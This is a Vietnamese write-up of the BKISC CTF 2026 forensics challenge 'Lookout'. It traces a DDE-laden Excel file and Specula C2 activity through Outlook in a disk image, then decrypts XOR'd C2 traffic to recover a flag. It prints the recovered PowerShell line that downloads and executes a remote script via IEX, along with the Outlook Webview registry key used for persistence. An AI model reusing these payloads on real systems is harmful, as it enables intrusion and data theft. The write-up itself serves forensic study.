+++
title = 'Lookout — Write-up'
date = '2026-06-13T23:00:00+07:00'
draft = false
tags = ['forensics', 'bkctf', 'BKCTF2026', 'malware', 'c2', 'specula', 'outlook', 'windows']
categories = ['CTF Write-ups', 'Forensics']
+++

# Lookout — Write-up

**BKISC CTF 2026 · Forensics**

---

## Đề bài

> *"Ai đó đang theo dõi bạn. Hãy tìm ra bằng chứng."*

**File đính kèm:** `chall.ad1` (2.2 GB — AccessData Logical Image)  
**Tải về:** [chall.ad1 — OneDrive](https://1drv.ms/u/c/2f661437c52d8a10/IQAkxaS_vTNwQqKoi0vLrxCKAVn2vWZRkgYDzcLD1hlrsOQ?e=U1klCW)

**Mục tiêu:** Phân tích ảnh đĩa pháp y để tìm Flag bị ẩn giấu.

---

## Tổng quan chuỗi tấn công

![**Hình 1.** Toàn cảnh chuỗi tấn công từ file ảnh đĩa đến lúc lấy Flag.](/images/write-ups/bkctf-2026-lookout/fig1_attack_chain.png)

Khi nhìn tổng thể, đây là một bài về phân tích mã độc thực tế: kẻ tấn công gửi file `report.xlsx` qua email → nạn nhân mở file → mã độc kích hoạt Specula C2 Framework qua Outlook → hacker thu thập dữ liệu mã hóa → xóa dấu vết. Nhiệm vụ của mình là tái dựng lại toàn bộ chuỗi đó từ một file ảnh đĩa duy nhất.

---

## Bước 1 — Tiếp cận file ảnh đĩa (và chuỗi thất bại ban đầu)

Định dạng `.ad1` là **AccessData Logical Image** — định dạng ảnh đĩa độc quyền của hãng AccessData (nay là Exterro), thường dùng trong pháp y doanh nghiệp. Khác với `.dd` hay `.E01`, file `.ad1` không phải raw image — nó lưu trữ file theo cấu trúc logic có container riêng, nên hầu hết công cụ Linux thông thường không đọc được trực tiếp.

### Thất bại 1: FTK Imager

Công cụ "chính thống" để mở `.ad1` là FTK Imager. Trên Windows không có vấn đề gì, nhưng FTK Imager cho Linux đã bị AccessData ngừng hỗ trợ từ lâu. Mình thử dùng Wine để chạy phiên bản Windows nhưng các driver pháp y không tương thích.

### Thất bại 2: Autopsy

Autopsy (phiên bản Linux) hỗ trợ mở `.ad1` qua plugin của Sleuth Kit. Mình cài và chạy:

```bash
autopsy
```

Autopsy khởi động nhưng ngay lập tức văng lỗi:
```
Insecure dependency in open while running with -T switch at /usr/bin/autopsy line 45.
```

Đây là lỗi **Perl Taint Mode** (`-T` flag) — một cơ chế bảo mật của Perl kiểm tra biến môi trường "ô nhiễm". Trên Parrot OS, biến `$PATH` chứa các thư mục người dùng không được Taint mode chấp nhận.

Workaround: Sửa shebang của script Autopsy để bỏ flag `-T`:

```bash
sudo nano /usr/bin/autopsy
# Dòng 1: #!/usr/bin/perl -wT  →  #!/usr/bin/perl -w
```

Autopsy mở được, nhưng khi nạp file `.ad1` vào thì trình duyệt file không hiển thị cấu trúc bên trong — chỉ thấy raw data của container, không phân tích được hệ thống file NTFS.

### Thất bại 3: Biên dịch libad1 từ nguồn

Trong kho `AD1Tools` đi kèm challenge, có mã nguồn C của thư viện `libad1` với file `ad1extract`. Mình thử biên dịch:

```bash
cd AD1-tools/AD1Tools/libad1/
./configure && make
```

```
configure: error: Package requirements (fuse >= 2.6) were not met:
No package 'fuse' found
```

Cài `libfuse-dev` xong, biên dịch được — nhưng khi chạy thì segfault ngay khi xử lý file `.ad1` này, có thể do version format không tương thích.

### Thất bại 4: binwalk trực tiếp lên AD1

```bash
binwalk chall.ad1
```

Trả về hàng trăm false positive — Zlib headers, JPEG fragments đủ loại — vì `binwalk` không hiểu cấu trúc container AD1, nó chỉ quét signature mù.

### Giải pháp: Dissect Framework

Sau hồi mò mẫm, mình tìm ra **Dissect** — framework pháp y Python mã nguồn mở của Fox-IT, hỗ trợ nhiều định dạng ảnh đĩa kể cả AD1.

```bash
pip install dissect
target-shell chall.ad1
```

Dissect nhận ra NTFS bên trong container AD1 và mở một shell tương tác. Cú pháp của nó khá lạ — dùng đường dẫn Windows thay vì Linux:

```
chall.ad1:/> ls
\/:NONAME [NTFS]

chall.ad1:/> cd \/:NONAME\ [NTFS]/[root]/Users/BKISC/
chall.ad1:/\/:NONAME [NTFS]/[root]/Users/BKISC> ls
AppData/
Desktop/
Documents/
Downloads/
```

### Thất bại khi cố xuất file

Mình tìm thấy file OST và muốn copy ra ngoài:

```bash
chall.ad1:/...> save nguyencocay986@gmail.com.ost /home/user/ost_file.ost
save: No such file or directory
```

Lệnh `save` không tồn tại. Thử `cat` redirect cũng không ra file. Vậy là `target-shell` không có lệnh copy trực tiếp.

### Python nhúng trong target-shell

`target-shell` có lệnh `python` mở một IPython REPL với biến `t` (target object) được nạp sẵn. Đây là cách duy nhất để trích xuất file.

Lần đầu thử, mình dùng sai tên biến:

```python
# Bên trong target-shell > python
for p in fs.cwd().iterdir():   # ← NameError: name 'fs' is not defined
    ...
```

API đúng phải là `t.fs`:

```python
# Đúng: object target là 't', filesystem là 't.fs'
for p in t.fs.path("/").rglob("*"):
    print(p)
```

Mình dump toàn bộ danh sách file ra ngoài để xem toàn cảnh:

```python
with open("/home/user/danh_sach_file_dissect.txt", "w") as out:
    for p in t.fs.path("/").rglob("*"):
        out.write(str(p) + "\n")
```

Duyệt qua file đó, tìm ra các artifact quan trọng:

```
.../Recent/report.xlsx.lnk          ← nạn nhân đã mở report.xlsx gần đây
.../Recent/report.zip.lnk           ← và report.zip
.../Downloads/report.zip            ← file ZIP gốc vẫn còn
.../Outlook/nguyencocay986@gmail.com.ost  ← hộp thư Outlook
```

Hai file `.lnk` trong `Recent` xác nhận nạn nhân đã mở cả hai file đó. Tiếp theo mình trích xuất file OST:

```python
ost_path = t.fs.path(
    "/\\/:NONAME [NTFS]/[root]/Users/BKISC/AppData/Local/Microsoft/Outlook/"
    "nguyencocay986@gmail.com.ost"
)
with open("/home/user/nguyencocay986.ost", "wb") as f:
    f.write(ost_path.open().read())
print("Trích xuất OST thành công:", ost_path.stat().st_size, "bytes")

---

## Bước 2 — Phân tích hộp thư OST

Mình trích xuất file `.ost` ra ngoài và dùng `binwalk` để quét cấu trúc bên trong:

```bash
binwalk nguyencocay986@gmail.com.ost
```

Kết quả phát hiện một file ZIP bị mã hóa:

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
899584        0xDBA00         Zip archive data, encrypted at least v2.0 to extract,
                              compressed size: 81738, uncompressed size: 84942,
                              name: report.xlsx
```

Có một file `report.xlsx` bị mã hóa bằng mật khẩu, nằm trong email. Mình thử trích xuất và bẻ khóa mật khẩu:

```bash
binwalk -e nguyencocay986@gmail.com.ost
zip2john DBA00.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt
```

### Bẫy đầu tiên: File ZIP bị hỏng cấu trúc

`zip2john` trả về lỗi:
```
Did not find End Of Central Directory.
```

**Tại sao?** File OST lưu dữ liệu theo Block không liên tục (giống FAT cluster). `binwalk` không hiểu cấu trúc này — nó chỉ tìm thấy byte đầu của file ZIP rồi chép thẳng 15MB dữ liệu liên tiếp, bao gồm cả rác từ các Block khác của OST. Kết quả là cấu trúc **End Of Central Directory (EOCD)** không khớp, khiến mọi công cụ ZIP đều từ chối xử lý.

> **Bài học:** Khi dùng `binwalk` để trích xuất dữ liệu từ các định dạng container phức tạp (OST, PST, VHD...), kết quả trích xuất cần được xác minh tính toàn vẹn trước khi dùng.

---

## Bước 3 — Lách qua mật khẩu bằng Autosave

Thay vì cố sửa file ZIP bị hỏng, mình chuyển hướng suy nghĩ: *Nếu nạn nhân đã mở được file này và nhập mật khẩu, thì Office có thể đã lưu bản nháp không mã hóa ở đâu đó.*

Microsoft Office có tính năng **Autosave** — khi người dùng mở và chỉnh sửa file, Office tự tạo bản sao tạm trong AppData mà **không áp dụng mật khẩu** của file gốc. Đây là điểm yếu quan trọng về mặt pháp y.

Quay lại `target-shell`, mình tìm kiếm trong thư mục Autosave của Excel:

```
chall.ad1:/> cd [root]/Users/BKISC/AppData/Roaming/Microsoft/Excel/report312080493576797376/
chall.ad1:/...> ls

report((Unsaved-312080580921779168)).xlsb
report((Unsaved-312080580921779168)).xlsb.FileSlack
report.xlsx.lnk
report.xlsx.lnk.FileSlack
```

Có một file Autosave: `report((Unsaved-312080580921779168)).xlsb`. Mình dùng Python nhúng của `target-shell` để trích xuất:

```python
# Bên trong target-shell > python
for p in t.fs.path("/").rglob("*Unsaved*"):
    if "report" in p.name and "xlsb" in p.name and "FileSlack" not in p.name:
        with open("/home/user/report_autosave.xlsb", "wb") as f:
            f.write(p.open().read())
        print("Trích xuất thành công!")
```

---

## Bước 4 — Phân tích XLSB và kỹ thuật DDE Attack

File `.xlsb` (Excel Binary Workbook) thực chất là một ZIP chứa các file nhị phân. Mình giải nén:

```bash
unzip report_autosave.xlsb -d mo_xe_excel/
```

Cấu trúc bên trong:

```
mo_xe_excel/
├── [Content_Types].xml
├── xl/
│   ├── workbook.bin
│   ├── worksheets/sheet1.bin
│   ├── sharedStrings.bin
│   ├── externalLinks/
│   │   └── externalLink1.bin    ← ĐÂY RỒI
│   └── media/image1.jpeg
└── ...
```

### Bẫy thứ hai: Không có Macro

Khi kiểm tra, file này **không có** `vbaProject.bin` (file chứa Macro VBA). Đây là cách mã độc tránh bị phát hiện bởi các công cụ diệt virus thông thường, vốn chủ yếu quét Macro.

Thay vào đó, payload nằm trong `externalLink1.bin`. Mình viết script đọc các chuỗi UTF-16 từ file này (vì Office lưu chuỗi text dạng Unicode):

```python
import struct

with open("mo_xe_excel/xl/externalLinks/externalLink1.bin", "rb") as f:
    data = f.read()

# Trích xuất chuỗi UTF-16LE
decoded = data.decode('utf-16le', errors='ignore')
for line in decoded.split('\x00'):
    if len(line) > 10:
        print(line)
```

Kết quả:

```
cmd.exe /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(
"http://192.168.1.189:1704/report.txt");IEX $e
StdDocumentName
```

Đây là kỹ thuật **DDE (Dynamic Data Exchange) Attack**: Office cho phép file nhúng "liên kết ngoài" tới các nguồn dữ liệu bên ngoài. Kẻ tấn công đã lợi dụng tính năng này để chạy lệnh shell khi file được mở. Lệnh PowerShell sẽ tải và thực thi script `report.txt` từ IP `192.168.1.189:1704` trực tiếp trên RAM.

---

## Bước 5 — Trích xuất Event Log từ Zlib Chunks

Để biết nội dung `report.txt` đã làm gì, mình cần xem **PowerShell Script Block Logging** — tính năng của Windows ghi lại mọi đoạn mã PowerShell được thực thi (Event ID 4104, lưu trong Event Log).

### Bẫy thứ ba: Dữ liệu bị nén Zlib

File `.ad1` không lưu dữ liệu dạng thô. Nó nén toàn bộ block dữ liệu bằng **Zlib** trước khi ghi vào file ảnh. Vì vậy, chạy `grep` hay `strings` trực tiếp trên `chall.ad1` sẽ không tìm thấy gì — dữ liệu đã bị nén và không đọc được dạng text.

![**Hình 3.** Cách quét Zlib Chunk để tìm Event Log ẩn bên trong file ảnh đĩa.](/images/write-ups/bkctf-2026-lookout/fig3_zlib_scan.png)

Giải pháp: Mình viết script Python dùng `mmap` để đọc file 2.2GB không bị tràn RAM, rồi tìm các magic byte của Zlib (`\x78\x9C`, `\x78\xDA`, `\x78\x01`) và thử giải nén từng khối:

```python
import mmap, re, zlib

with open("chall.ad1", "rb") as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)

target_utf16 = "192.168.1.189".encode("utf-16le")

for match in re.finditer(b'\x78[\x01\x5e\x9c\xda]', mm):
    idx = match.start()
    try:
        d = zlib.decompressobj()
        decomp = d.decompress(mm[idx:idx+200000])
        if target_utf16 in decomp:
            print(f"[+] TÌM THẤY tại offset {hex(idx)}")
            # In ngữ cảnh UTF-16 xung quanh
            pos = decomp.find(target_utf16)
            ctx = decomp[max(0,pos-200):pos+500].decode('utf-16le', 'ignore')
            print(ctx)
    except Exception:
        pass
```

### Kết quả

Script tìm ra nhiều khối dữ liệu quan trọng. Quan trọng nhất là đoạn nhật ký từ Script Block Logging và HTTP request của mã độc:

```
[+] TÌM THẤY tại khối 0x5d48333c:
  HostApplication=powershell.exe -w hidden $e=(New-Object System.Net.WebClient)
  .DownloadString("http://192.168.1.189:1704/report.txt");IEX $e

o4WlfbKbx1xik1TgTQGeOQ||http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ,...

[+] TÌM THẤY tại khối 0x5624416e:
  User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64;
              Trident/7.0; Specula;
  Post: 192.168.1.189:8386
  _"3F55250908166B24175D1C0C190B74246E7E12162A231C1B15272F31084D3C54...
```

---

## Bước 6 — Nhận diện Specula C2 Framework

Từ User-Agent có chữ `Specula`, mình tra cứu và xác nhận: đây là **Specula** — một C2 (Command & Control) Framework được phát triển bởi TrustedSec, chuyên khai thác tính năng **Home Page** của Outlook.

![**Hình 2.** Cơ chế hoạt động của Specula C2: biến Outlook thành một Beacon giao tiếp với máy chủ.](/images/write-ups/bkctf-2026-lookout/fig2_specula_c2.png)

### Cơ chế hoạt động

Specula hoạt động bằng cách ghi đè Registry:

```
HKCU\Software\Microsoft\Office\16.0\Outlook\Webview\Inbox
  URL = http://192.168.1.189:8386/plugin/search/
```

Khi Outlook khởi động, nó tự động tải trang web từ URL trên vào khung WebView (một tính năng cũ của Outlook). Trang web này chứa VBScript độc hại hoạt động như một Beacon: định kỳ gửi thông tin về máy chủ C2 và nhận lệnh để thực thi.

### Dữ liệu truyền đi

Dữ liệu mà Specula gửi về máy chủ được mã hóa bằng XOR, định dạng Hex. Nhiều chuỗi Hex xuất hiện trong log:

```
3F55250908166B24175D1C0C190B74246E7E12162A231C395D2A5C42085824...
4C141D1915166B100D5F581D035474043B3522453B3E4F5332184616230758...
2B513B0912076B04115D1D534B726E3B012222173C0D2D7F1E3F253E0F070B...
```

Điều quan trọng: trong log cũng xuất hiện **Agent ID** của Specula ở dạng plaintext:
```
o4WlfbKbx1xik1TgTQGeOQ
```

Trong giao thức của Specula, Agent ID này đồng thời là **khóa XOR** để mã hóa/giải mã dữ liệu truyền tải.

---

## Bước 7 — Giải mã toàn bộ Payload

![**Hình 4.** Quy trình giải mã XOR và RC4 để thu được Flag cuối cùng.](/images/write-ups/bkctf-2026-lookout/fig4_xor_decrypt.png)

Biết khóa, mình viết script quét toàn bộ file ảnh đĩa, tìm mọi chuỗi Hex dài (≥ 50 ký tự), giải mã XOR và lọc những nội dung có nghĩa:

```python
import mmap, re, zlib, binascii

KEY = b"o4WlfbKbx1xik1TgTQGeOQ"

def xor_decrypt(hex_str, key):
    data = binascii.unhexlify(hex_str)
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

with open("chall.ad1", "rb") as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)

seen = set()
for match in re.finditer(b'\x78[\x01\x5e\x9c\xda]', mm):
    idx = match.start()
    try:
        decomp = zlib.decompressobj().decompress(mm[idx:idx+200000])
        for hex_match in re.finditer(b'[0-9A-Fa-f]{50,}', decomp):
            hex_str = hex_match.group(0).decode()
            if hex_str in seen:
                continue
            seen.add(hex_str)
            if len(hex_str) % 2 != 0:
                hex_str = hex_str[:-1]
            try:
                plain = xor_decrypt(hex_str, KEY).decode('ascii', 'ignore')
                if any(kw in plain for kw in ["def RC4", "flag", "print", "Desktop"]):
                    print(f"--- PAYLOAD {len(hex_str)} ký tự ---")
                    print(plain[:500])
                    print()
            except Exception:
                pass
    except Exception:
        pass
```

### Kết quả giải mã

Ba payload có nghĩa được tìm thấy:

**Payload 1 — Danh sách file trên Desktop:**
```
Parent Folder: C:/Users/BKISC/Desktop
F: C:\Users\BKISC\Desktop\desktop.ini - Size: 0mb - LastModified: 07/04/2024 19:05:48
F: C:\Users\BKISC\Desktop\flag.py     - Size: 0mb - LastModified: 25/07/2025 15:41:41
F: C:\Users\BKISC\Desktop\Obsidian.lnk
D: C:\Users\BKISC\Desktop\PS_Transcripts - LastModified: 01/10/2025 02:11:40
```

Có một file `flag.py` trên Desktop!

**Payload 2 — Nội dung của `flag.py` (được gửi về C2 trước khi xóa):**
```python
# Just run the code to get the flag lol

def RC4(key : bytes, plaintext : bytes):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)
    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```

**Payload 3 — Xác nhận xóa dấu vết:**
```
Delete file: C:\Users\BKISC\Desktop\flag.py - Success!
```

### Bẫy thứ tư: File đã bị xóa khỏi đĩa

Hacker đã chạy `flag.py` để lấy Flag rồi xóa ngay file đó. Dù mình cố khôi phục file từ đĩa (data carving) cũng không tìm thấy vì các sector đã bị ghi đè. Tuy nhiên, nhờ Specula gửi **nội dung file** về C2 server — và log đó được ghi lại vào Event Log — mình đã khôi phục được toàn bộ mã nguồn mà không cần file gốc.

---

## Bước 8 — Lấy Flag

Mình chạy lại chính đoạn code Python của kẻ tấn công:

```python
def RC4(key : bytes, plaintext : bytes):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)
    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```

Kết quả:

```
BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}
```

$$\boxed{\texttt{BKISC\{l0oK\_Ou7\_f0R\_0u71o0k\_C2!!!\}}}$$

---

## Nhận xét

| Lớp bảo vệ của attacker | Cách vượt qua |
|---|---|
| Mã hóa mật khẩu file ZIP | Tìm bản Autosave không mã hóa trong AppData |
| Không dùng Macro VBA | Nhận ra DDE Attack qua `externalLink1.bin` |
| Dữ liệu trên đĩa bị nén Zlib | Quét và giải nén từng chunk theo magic byte |
| Giao tiếp C2 mã hóa XOR | Agent ID lộ trong log → khóa giải mã |
| Xóa `flag.py` sau khi chạy | Payload gốc đã bị ghi vào Event Log trước khi xóa |

Bài này thú vị ở chỗ không có bước nào là "công cụ thần kỳ giải quyết mọi thứ" — mỗi lớp bảo vệ đều phải phân tích lý do nó bị hỏng thay vì chỉ dùng brute force. Đặc biệt, việc nhận ra Specula và hiểu giao thức của nó là bước then chốt để giải mã được payload.
